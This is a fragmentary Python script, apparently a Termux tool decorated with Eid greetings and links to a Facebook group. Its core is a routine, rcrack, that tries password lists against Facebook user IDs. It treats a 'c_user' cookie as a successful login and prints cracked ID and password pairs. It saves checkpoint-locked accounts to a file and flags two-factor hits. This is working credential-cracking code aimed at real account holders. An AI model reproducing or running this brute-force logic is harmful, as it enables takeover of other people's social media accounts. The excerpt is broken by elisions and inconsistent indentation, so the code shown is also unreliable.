...
os.system('xdg-open https://facebook.com/groups/100072425385396/')
...
os.system('xdg-openhttps://www.facebook.com/profile.php?id=100072425385396')
...
os.system('espeak -a 300 " Wishing everyone an early Eid from RABBI X ISLAM TERMUX WORLD"')
...
┌────♣─────┐
               ...
               ❤
      Wishing everyone an early Eid from TAJUL X ISLAM TERMUX WORLD
               🧡
        Eid mubarak 
               💙 
       ༊᭄
...
for i in range(1):
  os.system('espeak -a 300 " ঈদ মোবারক রাব্বি"')
  os.system("clear")
  time.sleep(0.08)
  print(bgreen + stlp)
  time.sleep(0.08)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\33[1;97m[\33[1;92mTAJUL-👻\33[1;97m]\33[1;94m [%s/%s] \33[1;92mOK:-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;34m[\033[\033[0;101mTAJUL\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
          ...
          #  elif 'checkpoint' in log_cookies:
              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
          #      cid = coki[24:39]
             #   print('\r\r\33[1;34m TAJUL-CP ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/TAJUL-cp👻.txt', 'a').write( uid+' | '+ps+' \n')
               # cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mTAJUL-2F '+uid+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
